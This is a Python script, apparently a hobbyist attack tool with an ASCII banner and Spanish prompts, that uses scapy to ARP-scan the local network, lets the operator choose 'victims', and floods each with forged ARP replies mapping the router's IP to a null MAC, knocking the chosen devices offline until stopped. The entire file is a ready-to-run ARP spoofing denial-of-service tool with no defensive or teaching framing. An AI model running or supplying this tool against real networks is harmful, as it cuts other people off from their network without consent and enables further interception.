from scapy.all import ARP, Ether, srp, send, conf
import time
import sys
import re
import os
import ipaddress
import threading

def print_banner():
    banner = r"""
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌          ▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░▌           ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌▐░▌     ▐░▌  ▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌               ▐░▌     ▐░▌                    ▐░▌▐░▌          
▐░▌       ▐░▌▐░▌      ▐░▌ ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄      ▐░▌     ▐░▌           ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀         ▀  ▀         ▀  ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                    
██████╗ ██╗   ██╗    ██████╗ ███████╗████████╗██████╗  ██████╗ 
██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═████╗
██████╔╝ ╚████╔╝     ██████╔╝█████╗     ██║   ██████╔╝██║██╔██║
██╔══██╗  ╚██╔╝      ██╔══██╗██╔══╝     ██║   ██╔══██╗████╔╝██║
██████╔╝   ██║       ██║  ██║███████╗   ██║   ██║  ██║╚██████╔╝
╚═════╝    ╚═╝       ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ 
"""
    print("\033[91m" + banner + "\033[0m")


def validate_ip(ip):
    pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    return pattern.match(ip) is not None

def get_default_gateway():
    try:
        with os.popen("ip route | grep default") as route:
            output = route.read()
            if output:
                return output.split()[2]
    except Exception:
        return None

def arp_scan(network):
    print(f"[🔍] Escaneando la red {network}...")
    devices = {}

    try:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)
        ans, _ = srp(pkt, timeout=1, retry=1, verbose=0)

        for _, rcv in ans:
            ip = rcv.psrc
            mac = rcv.hwsrc
            devices[ip] = mac

    except Exception as e:
        print(f"[X] Error en escaneo ARP: {e}")

    return devices

def get_user_input(devices):
    print("\n[✔] Dispositivos detectados:")
    for i, (ip, mac) in enumerate(devices.items()):
        print(f"  [{i}] IP: {ip:15} | MAC: {mac}")

    seleccion = input("\n[+] Selecciona los índices de las víctimas (ej: 0,2) o deja vacío para omitir: ").strip()
    indices = seleccion.split(",") if seleccion else []
    
    victimas = []

    # IPs seleccionadas por índice
    for idx in indices:
        try:
            i = int(idx)
            ip = list(devices.keys())[i]
            mac = devices[ip]
            victimas.append((ip, mac))
        except:
            print(f"[X] Índice inválido: {idx}")

    # IPs manuales
    manual = input("\n[+] ¿Deseas ingresar alguna IP manualmente? (ej: 192.168.0.123,192.168.0.200) o deja vacío: ").strip()
    if manual:
        ip_list = manual.split(",")
        for ip in ip_list:
            ip = ip.strip()
            if validate_ip(ip):
                mac = get_mac(ip)
                if mac:
                    victimas.append((ip, mac))
                else:
                    print(f"[!] No se pudo resolver la MAC de {ip}, aún así será atacada con MAC falsa.")
                    victimas.append((ip, "00:00:00:00:00:00"))  # fake fallback
            else:
                print(f"[X] IP inválida: {ip}")

    # Eliminar duplicados
    final = []
    seen = set()
    for ip, mac in victimas:
        if ip not in seen:
            final.append((ip, mac))
            seen.add(ip)

    return final


def spoof_target(router_ip, router_mac, victima_ip, interval=0.5):
    fake_mac = "00:00:00:00:00:00"
    try:
        while True:
            packet = ARP(op=2, pdst=victima_ip, psrc=router_ip, hwsrc=fake_mac)
            send(packet, verbose=False)
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n[!] Parando ataque a {victima_ip}. Restaurando conexión...")
        restore = ARP(op=2, pdst=victima_ip, psrc=router_ip, hwsrc=router_mac)
        send(restore, count=5, verbose=False)
        print(f"[✔] Conexión restaurada a {victima_ip}")

def start_attack(router_ip, victims, interval=0.5):
    router_mac = get_mac(router_ip)
    if not router_mac:
        print("[X] No se pudo obtener la MAC del router.")
        return

    print("\n[🔥] Iniciando ataque ARP spoofing...")
    print("Presiona Ctrl+C para detener y restaurar conexiones.\n")

    threads = []
    for ip, _ in victims:
        t = threading.Thread(target=spoof_target, args=(router_ip, router_mac, ip, interval))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Ataque detenido.")

def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=2, retry=1, verbose=0)
    for _, rcv in ans:
        return rcv.hwsrc
    return None

if __name__ == "__main__":
    print_banner()
    if not sys.platform.startswith("linux"):
        print("[X] Este script solo es compatible con sistemas Linux.")
        sys.exit(1)
    if os.geteuid() != 0:
        print("[X] Este script debe ejecutarse como superusuario (root).")
        sys.exit(1)

    conf.verb = 0

    router_ip = get_default_gateway()
    if not router_ip:
        print("[X] No se pudo detectar la IP del router.")
        sys.exit(1)

    ip_parts = router_ip.split(".")
    network_range = ".".join(ip_parts[:3]) + ".0/24"

    dispositivos = arp_scan(network_range)
    if not dispositivos:
        print("[X] No se encontraron dispositivos.")
        sys.exit(1)

    victimas = get_user_input(dispositivos)
    if not victimas:
        print("[X] No se seleccionó ninguna víctima.")
        sys.exit(1)

    start_attack(router_ip, victimas, interval=0.3)
